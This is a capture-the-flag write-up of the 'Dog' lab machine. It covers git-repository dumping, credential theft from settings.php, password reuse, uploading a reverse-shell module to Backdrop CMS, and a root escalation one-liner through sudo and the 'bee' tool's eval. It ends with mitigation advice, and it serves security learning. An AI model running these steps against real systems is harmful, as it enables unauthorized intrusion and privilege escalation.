# Dog

```
Difficulty: Easy
Operating System: Linux
Hints: True
```

##  Summary

| Step | User / Access | Technique Used                | Result                                                                   |
| :--- | :------------ | :---------------------------- | :----------------------------------------------------------------------- |
| 1    | `N/A`         | Port Scanning                 | Found HTTP, SSH, and exposed `.git` repository.                          |
| 2    | `N/A`         | Git Dump                      | Extracted configuration and email of `tiffany`.                          |
| 3    | `tiffany`     | Database Credential Discovery | Discovered MySQL password in `settings.php`.                             |
| 4    | `tiffany`     | Admin Login                   | Logged into Backdrop CMS with credentials.                               |
| 5    | `www-data`    | Module Upload                 | Uploaded a custom module for reverse shell to obtain `www-data`.         |
| 6    | `johncusack`  | Credential Reuse              | Logged in via SSH using same database password.                          |
| 7    | `root`        | Sudo with Custom Tool         | Used vulnerable `bee` CLI tool to execute system commands and gain root. |

---

---

##  Initial Enumeration

### 1. **Nmap Scan**

```bash
nmap dog.htb -sV -A -Pn -T4
```

* Found open ports:

  * `22/tcp` — SSH (OpenSSH 8.2p1)
  * `80/tcp` — HTTP (Apache 2.4.41 with Backdrop CMS 1.20)
  * `.git` directory exposed!

---

##  Git Repository Leak

### 2. **Git Dump**

```bash
git-dumper http://dog.htb/.git/ ./dog-git
```

* Found user email in config:

  * `tiffany@dog.htb`

### 3. **Database Credentials**

Extracted from `settings.php`:

```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

* MySQL password: `BackDropJ2024DS2024`

---

##  Initial Access

### 4. **Login as Tiffany**

* Found Backdrop CMS login page.
* Credentials:

  * Username: `tiffany`
  * Password: `BackDropJ2024DS2024`
* Logged into the admin dashboard.

---

##  File Upload for Code Execution

### 5. **Module Upload**

* Found module installation feature.
* Downloaded official Backdrop CMS module.
* Modified module to include reverse shell payload:

  * Allowed formats: `.tar`, `.tgz`, `.gz`, `.bz2`
* Uploaded and enabled the malicious module.
* Triggered module functionality to execute reverse shell and obtain `www-data` access.

---

## Privilege Escalation to johncusack

### 6. **Database Password Reuse**

* Entered MySQL:

  ```bash
  mysql -u root -p
  # Password: BackDropJ2024DS2024
  ```
* Found a password hash for `johncusack`.
* Tried default passwords → succeeded using `BackDropJ2024DS2024`.

```bash
ssh johncusack@dog.htb
# Password: BackDropJ2024DS2024
```

---

##  Privilege Escalation to root

### 7. **Custom Command-Line Tool 'bee'**

```bash
sudo -l
```

Revealed:

```
(ALL : ALL) /usr/local/bin/bee
```

* Inspected `bee` code: Contains an `eval()` function and is intended to run from CLI only.

### 8. **Gaining Root**

* Started `bee` from `/var/www/html` as required.
* Executed arbitrary PHP code to get root shell:

  ```bash
  sudo /usr/local/bin/bee eval 'system("/bin/bash");'
  ```
* Captured `root.txt` from `/root/root.txt`.

---



##  Mitigation Advice

* Prevent `.git` directory exposure by properly configuring the web server.
* Never reuse database credentials as login passwords.
* Harden file upload functionality; restrict upload types and validate contents.
* Audit custom tools and remove eval-like unsafe functionality.
* Apply principle of least privilege to limit sudo permissions.

